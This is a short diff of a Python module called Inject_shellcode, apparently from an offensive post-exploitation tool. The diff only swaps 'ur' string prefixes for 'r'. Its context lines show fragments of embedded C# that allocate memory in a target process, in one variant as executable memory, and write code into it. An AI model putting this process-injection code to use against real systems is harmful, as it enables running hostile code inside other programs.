@@ -45,7 +45,7 @@ class Inject_shellcode(Module):
                                                 
     """
 
-    _runtime_code = ur"""
+    _runtime_code = r"""
                     using System;using System.IO;using System.Diagnostics;using System.Text;
                     using System.Runtime.InteropServices; using System.IO.Compression;
 
@@ -230,7 +230,7 @@ class Inject_shellcode(Module):
                     }   
                     """
 
-    _runtime_code_virtual = ur"""
+    _runtime_code_virtual = r"""
                     IntPtr codeMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, codeMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                     if(codeMemAddress == (IntPtr)0){
                         output += error_string + "\n\tError allocating code buffer memory.\n\tVirtualAllocEx failed with error code " + Marshal.GetLastWin32Error(); 
@@ -245,7 +245,7 @@ class Inject_shellcode(Module):
                     output += "\n\n\tCode written into remote process. Bytes written: " + bytesWrittenCode.ToString();
     """
 
-    _runtime_code_virtual_protect = ur"""
+    _runtime_code_virtual_protect = r"""
                     uint codeMemSize = codeMemorySize;
                     IntPtr codeMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, codeMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                     if(codeMemAddress == (IntPtr)0){
